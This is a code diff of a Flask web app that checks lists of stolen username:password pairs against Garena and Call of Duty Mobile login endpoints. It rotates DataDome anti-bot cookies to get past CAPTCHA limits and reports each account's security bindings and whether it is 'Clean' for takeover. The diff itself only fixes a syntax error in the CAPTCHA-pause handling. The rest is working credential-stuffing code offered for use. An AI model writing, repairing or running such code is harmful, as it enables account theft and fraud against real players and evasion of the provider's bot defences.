@@ -1,4 +1,4 @@
-# --- START OF FINAL, COMPLETE app.py ---
+# --- START OF FINAL, CORRECTED app.py ---
 
 # --- Standard and System Imports ---
 import os, sys, re, time, json, uuid, base64, hashlib, random, logging, urllib, threading, secrets, html
@@ -27,13 +27,10 @@ try:
     import cookie_config
 except ImportError as e:
     print(f"FATAL ERROR: A required module is missing -> {e}", file=sys.stderr)
-    print("Please ensure all dependencies from requirements.txt are installed", file=sys.stderr)
-    print("and local modules (ken_cookie.py, etc.) are in the same directory.", file=sys.stderr)
     sys.exit(1)
 
 # --- APP CONFIGURATION ---
 BASE_DIR = os.path.abspath(os.path.dirname(__file__))
-# Note: This folder is for local dev. On Render, we use /tmp for uploads.
 UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
 
 # --- Flask App Initialization ---
@@ -167,7 +164,6 @@ def fetch_new_datadome_pool(num_cookies, user_id):
     if new_pool: log_message(f"[✅] Fetched {len(new_pool)} new unique cookies.", "text-success", user_id)
     else: log_message(f"[❌] Failed to fetch any new cookies.", "text-danger", user_id)
     return new_pool
-
 def format_result(user_id, last_login, country, shell, mobile, facebook, email_verified, authenticator_enabled, two_step_enabled, connected_games, is_clean, fb, email, username, password):
     is_clean_text, email_ver_text = ("Clean ✔", "(Verified✔)") if is_clean else ("Not Clean ⚠️", "(Not Verified⚠️)")
     bool_status = lambda status: "True ✔" if status == 'True' else "False ❌"
@@ -191,7 +187,6 @@ def format_result(user_id, last_login, country, shell, mobile, facebook, email_v
       Authenticator: {bool_status(authenticator_enabled)}
       - Presented By: PAPA MO -""".strip()
     return (console_message, is_clean)
-
 def show_level(access_token, selected_header, sso, token, newdate, cookie):
     try:
         url, params = "https://auth.codm.garena.com/auth/auth/callback_n", {"site": "https://api-delete-request.codm.garena.co.id/oauth/callback/", "access_token": access_token}
@@ -205,7 +200,6 @@ def show_level(access_token, selected_header, sso, token, newdate, cookie):
         if data and "user" in data: user_info = data["user"]; return f"{user_info.get('codm_nickname', 'N/A')}|{user_info.get('codm_level', 'N/A')}|{user_info.get('region', 'N/A')}|{user_info.get('uid', 'N/A')}"
         return "[FAILED] NO CODM ACCOUNT!"
     except Exception as e: return f"[FAILED] CODM data fetch error: {e}"
-
 def check_login(user_id, account_username, _id, encryptedpassword, password, selected_header, cookies, dataa, date, selected_cookie_module):
     try:
         cookies["datadome"] = dataa; login_params = {'app_id': '100082', 'account': account_username, 'password': encryptedpassword, 'redirect_uri': redrov, 'format': 'json', 'id': _id}
@@ -214,7 +208,6 @@ def check_login(user_id, account_username, _id, encryptedpassword, password, sel
         if 'error_auth' in login_json or 'error' in login_json: return "[🔐] ɪɴᴄᴏʀʀᴇᴄᴛ ᴘᴀssᴡᴏʀᴅ"
         session_key = login_json.get('session_key')
         if not session_key: return "[FAILED] No session key after login"
-        
         successful_token = response.cookies.get('token_session')
         sso_key = response.cookies.get('sso_key', '')
         coke = selected_cookie_module.get_cookies(); coke["datadome"] = dataa; coke["sso_key"] = sso_key
@@ -225,7 +218,6 @@ def check_login(user_id, account_username, _id, encryptedpassword, password, sel
         init_response = requests.get(init_url, params=params, timeout=120)
         init_response.raise_for_status(); init_json_response = init_response.json()
         if 'error' in init_json_response or not init_json_response.get('success', True): return f"[ERROR] {init_json_response.get('error', 'Bind check failed')}"
-        
         bindings = init_json_response.get('bindings', []); is_clean = "\033[0;32m\033[1mClean\033[0m" in init_json_response.get('status', "")
         country, last_login, fb, mobile, facebook, shell, email, email_verified, authenticator_enabled, two_step_enabled = ("N/A",)*10
         for item in bindings:
@@ -241,15 +233,12 @@ def check_login(user_id, account_username, _id, encryptedpassword, password, sel
                 elif key == "Authenticator": authenticator_enabled = "True"
                 elif key == "Two-Step Verification": two_step_enabled = "True"
             except ValueError: continue
-        
         game_info = show_level(login_json.get('access_token'), selected_header, sso_key, successful_token, dataa, cookies)
         if "[FAILED]" in game_info: connected_games = [f"No CODM account found or error: {game_info}"]
         else:
             codm_nickname, codm_level, codm_region, uid = game_info.split("|"); connected_games = [f"  Nickname: {codm_nickname}\n  Level: {codm_level}\n  Region: {codm_region}\n  UID: {uid}"]
-        
         return format_result(user_id, last_login, country, shell, mobile, facebook, email_verified, authenticator_enabled, two_step_enabled, connected_games, is_clean, fb, email, account_username, password)
     except Exception as e: return f"[FAILED] Check Login Error: {e}"
-
 def check_account(user_id, username, password, date, datadome_cookie, selected_cookie_module):
     try:
         random_id = "17290585" + str(random.randint(10000, 99999))
@@ -307,7 +296,9 @@ def run_check_task(user_id, file_path, selected_cookie_module_name, use_cookie_s
                     if not current_datadome:
                         log_message("[❌] All cookies on cooldown. Waiting for user...", "text-danger", user_id)
                         with status_lock: check_status[user_id]['captcha_detected'] = True
-                        captcha_pause_event.clear(); captcha_pause_event.wait(); with status_lock: check_status[user_id]['captcha_detected'] = False
+                        captcha_pause_event.clear()
+                        captcha_pause_event.wait()
+                        with status_lock: check_status[user_id]['captcha_detected'] = False
                         if stop_event.is_set(): break; continue
                     log_message(f"[▶] Checking: {username}:{password} with cookie ...{current_datadome[-6:]}", "text-info", user_id)
                     result = check_account(user_id, username, password, date, current_datadome, selected_cookie_module)
@@ -315,7 +306,12 @@ def run_check_task(user_id, file_path, selected_cookie_module_name, use_cookie_s
                         stats['captcha_count'] += 1; log_message(f"[🔴 CAPTCHA] on cookie ...{current_datadome[-6:]}. Cooldown 5 mins.", "text-danger", user_id)
                         cookie_state['cooldown'][current_datadome] = time.time() + 300
                         with status_lock: check_status[user_id]['captcha_detected'] = True
-                        captcha_pause_event.clear(); captcha_pause_event.wait(); with status_lock: check_status[user_id]['captcha_detected'] = False
+                        captcha_pause_event.clear()
+                        # THIS IS THE CORRECTED LINE
+                        captcha_pause_event.wait()
+                        with status_lock: 
+                            check_status[user_id]['captcha_detected'] = False
+                        # END CORRECTION
                         if stop_event.is_set(): break; continue
                     else: is_captcha_loop = False
                 if stop_event.is_set(): break
